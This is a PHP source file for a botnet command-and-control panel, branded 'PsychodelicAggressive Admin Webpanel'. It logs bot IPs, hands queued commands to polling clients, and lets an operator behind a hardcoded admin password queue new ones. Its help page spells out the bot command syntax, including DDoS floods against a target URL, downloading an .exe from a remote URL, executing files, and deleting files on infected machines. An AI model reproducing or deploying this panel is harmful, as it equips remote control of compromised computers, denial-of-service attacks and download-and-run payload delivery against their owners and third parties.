<?
$rip = $_SERVER['REMOTE_ADDR'];
$sd  = time();
$count = 1;

$file1 = "ip.txt";
$lines = file($file1);
$line2 = "";

foreach ($lines as $line_num => $line)
	{
		//echo $line."<br>";
		$fp = strpos($line,'****');
		$nam = substr($line,0,$fp);
		$sp = strpos($line,'++++');
		$val = substr($line,$fp+4,$sp-($fp+4));
		$diff = $sd-$val;
		if($diff < 300 && $nam != $rip)
			{
			 $count = $count+1;
			 $line2 = $line2.$line;
			 //echo $line2; 
			}
	}

$my = $rip."****".$sd."++++\n";
$open1 = fopen($file1, "w");
fwrite($open1,"$line2");
fwrite($open1,"$my");
fclose($open1);


$IPL=getenv("REMOTE_ADDR");
if ($_GET['l'] =="l" ) {






  $datei = fopen("counter.txt","r+");
  $counterstand = fgets($datei, 10);
  if($counterstand == "")
    {
    $counterstand = 0;
    }
  $counterstand++;
  rewind($datei);
  fwrite($datei, $counterstand);
  fclose($datei);


readfile("commands.txt");
exit;
}

$datei="IPTABLEADMIN_952766337730106fay.txt";
$dateizeiger=fopen($datei,"r");
while(!feof($dateizeiger))
{
$data = fgets($dateizeiger)."";
}
fclose($dateizeiger);

if ($_POST['user'] =="admin" or $data==$IPL) {
if ($_POST['pass'] =="holocs" or $data==$IPL) {
 $dateiname = "IPTABLEADMIN_952766337730106fay.txt"; // Name der Datei
 $handler = fOpen($dateiname, "w"); // Datei zum Text anhängen öffnen
 fWrite($handler, $IPL); // Dateiinhalt in die Datei schreiben
 fClose($handler); // Datei schließen

?>
<html>
<head>
<style type="text/css">
body {position:absolute;top:-9px;width:97%;}
.MAIN {width:100px;height:27px;background-image:url(img/dfb28793ac78c148bbabeef6d144e575_05.gif);}
.MAIN2 {position:relative;top:12px;left:26px;color:#757575;text-decoration:none;font-family:tahoma;font-size:10.6px;}
.MAIN3 {position:relative;top:12px;left:26px;color:#757575;text-decoration:none;font-family:tahoma;font-size:15.6px;}
.MAIN4 {position:relative;top:-30px;left:20px;color:white;font-family:arial;font-size:15.6px;}
a {color:#2f7f72;text-decoration:none;font-family:arial;font-size:9px;}
.nt {color:#2f7f72;text-decoration:none;font-family:arial;font-size:11px;}
</style>
</head>
<body bgcolor=#050505>
<center>
<table bgcolor="white" border="0" cellpadding="0" cellspacing="0">
<tr><td valign="top" background="img/dfb28793ac78c148bbabeef6d144e575_01.jpg">
<img src="img/dfb28793ac78c148bbabeef6d144e575_01.jpg">
</td>
<td width="597" valign=top>
<img src="img/dfb28793ac78c148bbabeef6d144e575_02.gif">

<table border="0" cellpadding="0" cellspacing="0"><tr><td valign=top>


<div class="MAIN">
<a href="?p=HOME" class="MAIN2">Home</A>
</div>

<div class="MAIN">
<a href="?p=SENDCMD" class="MAIN2">SendCommand</A>
</div>

<div class="MAIN">
<a href="?p=STATIC" class="MAIN2">Statistik</A>
</div>

<div class="MAIN">
<a href="?p=HELP" class="MAIN2">Help</A>
</div>

<div class="MAIN">
<a href="?p=LEGEND" class="MAIN2">History</A>
</div>

<div class="MAIN">
<a href="?p=OUT" class="MAIN2">logout</A>
</div>

</td><td valign=top>
<div style="position:relative;left:70px;" class=MAIN3>

<img src="img/dfb28793ac78c148bbabeef6d144e575_08.gif">


<div class=MAIN4>
<?

if ($_GET['p'] =="OUT") {
echo "<script>alert('Logged out!');</script>";
}
if ($_GET['p'] =="" or $_GET['p'] =="HOME") {
echo "PsychodelicAggressive Admin Webpanel";
}
if ($_GET['p'] =="SENDCMD") {
echo "Execute new Command";
}
if ($_GET['p'] =="LEGEND") {
echo "Commands History";
}
if ($_GET['p'] =="HELP") {
echo "HELP/FAQ/COMMANDS";
}
if ($_GET['p'] =="STATIC") {
echo "Statistic";
}
if ($_GET['p'] =="DELCMDS") {
 $dateiname = "commands.txt"; // Name der Datei
 $handler = fOpen($dateiname, "w"); // Datei zum Text anhängen öffnen
 fWrite($handler, ""); // Dateiinhalt in die Datei schreiben
 fClose($handler); // Datei schließen
echo "Commands are Clear!";

}
?>

</div>


<?

if ($_GET['p'] =="OUT") {
 $dateiname = "IPTABLEADMIN_952766337730106fay.txt"; // Name der Datei
 $handler = fOpen($dateiname, "w"); // Datei zum Text anhängen öffnen
 fWrite($handler, ""); // Dateiinhalt in die Datei schreiben
 fClose($handler); // Datei schließen
echo "<script> location.href = 'index.php'; </script>";
}
if ($_GET['p'] =="LEGEND") {
?><a href="index.php?p=DELCMDS" style="font-size:13px;text-decoration:underline;">Delete Command History</a><br><br><div class=nt><?
readfile("commands.txt");
?></div><?
}
if ($_GET['p'] =="STATIC") {
echo "user online:";
echo "<table width=180 height=30 bgcolor=#fdfdfd style=\"border: 1px green solid;\"><tr><td align=left valign=top>";
echo "<span style=\"font-family: verdana,arial,helvetica; font-size: 10px;\">";
echo "<a style=\"text-decoration: none; background-color: green; color: #ddccdd;\" href=\"http://www.hscripts.com\">H</a></span></td><td align=center>";
echo "<span style=\"font-family: verdana,arial,helvetica; font-size: 11px; font-weight: bold; color: #aaccaa;\">";
echo "Total users online - <font color=red>$count</font></span><br>";
echo "</td></tr></table>";
echo "<h4>Last Requests:</h4><div class=nt>";
readfile("IPLIST.php");
?></div><?
}

if ($_GET['p'] =="SENDCMD") {
if ($_POST)
 {
 $sendedcommand = $_POST["CMD"];
 $zufall = rand(100,1000000);
 $datum = date("d.m.Y",$timestamp);
 $uhrzeit = date("H:i",$timestamp);
 $sendcom = "<INPUTCOMMAND>$sendedcommand <RAND$datum$zufall$uhrzei>ID:$datum$zufall$uhrzei<br>
";
 $dateiname = "commands.txt"; // Name der Datei
 $handler = fOpen($dateiname, "a+"); // Datei zum Text anhängen öffnen
 fWrite($handler,  $sendcom); // Dateiinhalt in die Datei schreiben
 fClose($handler); // Datei schließen
 echo "<h3>Command Executed!</h3>";
}
?>
<center>
<form action="index.php?p=SENDCMD" method="post">
<input type="text" name="CMD" style="background-color:white;border:silver solid 1px;color:gray;width:95%;"><br><br>
<input type="submit" value="Send!" style="background-color:silver;width:100px;border:0px;color:gray;">
</form>
<a href="index.php?p=LEGEND" style="font-size:13px;">Show History</a><br>
<a href="index.php?p=DELCMDS" style="font-size:13px;">Delete Command History</a>

</center><br><br><br><a href="?p=HELP">For Help Click here</A>
<?}

if ($_GET['p'] =="HELP") {?>
<h2>Commannds:</h2><div class="nt">
<h4>DDOS :</h4>
DDOS[I=60][P=http://SERVERIP/index.php?S=AUFWENDIGEPROZEDUR]<br>ZB:<br>
DDOS[I=60][P=http://google.de/search?q=]<br>Definition:<br>
I=Intervall in Ms ( 1000MS = 1 Sekunde )<br>
DDOS=http://SERVER/AUFWENDIGEPROZEDUR<br><br><br>


<h4>Download a file :</h4>
DWD[URL=http://lalalla/23.exe][PATH=C:\23.exe]<br>Definition:<br>
URL=Datei aus dem internet runterladen<br>
PATH=Speicherort der Datei + Dateinamen!<br><br><br>

<h4>Execute a File:</h4>
EXEC[FILE=C:\1.exe]<br>Definition:<br>
FILE=Datei zum ausführen (Alle Datei Arten: html,html,txt...)<br><br><br>

<h4>Socket Timer:</h4>
TIMER[I=60000]<br>Definition:<br>
I=INTERVALL in MS (1000MS = 1 Sek MAX: 65000 MS) <br>This Command set the intervall time for get new Commands<br><br><br>

<h4>Kill File(s):</h4>
KILL[FILE=C:\000.exe]<br>Definition:<br>
FILE= File to be kill/delete

</div>


<?}

?>

</td></tr></table>

</td><td background="img/dfb28793ac78c148bbabeef6d144e575_03.gif">

<img src="img/dfb28793ac78c148bbabeef6d144e575_03.gif">

</td></tr></table>





</html>
<?





}}

else {{
?>
<body bgcolor=black style="overflow:hidden;"><br><div style="position:absolute;width:100%;height:100%;"><center><img src="img/login.jpg"></center></div>
<div style="position:absolute;width:100%;height:100%;"><center>
<form action="index.php?" method="POST">
<div style="position:relative;top:361px;left:36px;"><input type="password" name="pass" style="background-color:white;border:silver solid 0px;color:gray;width:219px;"></div>
<div style="position:relative;top:306px;left:36px;"><input type="text" name="user" style="background-color:white;border:silver solid 0px;color:gray;width:220px;"></div>
<div style="position:relative;top:366px;left:6px;"><input type="submit" value="" style="background-color:transparent;width:100px;border:gray solid 0px;color:gray;"></div>
</form>
</center></div><div style="position:absolute;top:98%;left:95%;color:gray;font-size:10px;"><? echo getenv("REMOTE_ADDR"); ?>
<?
}}
?>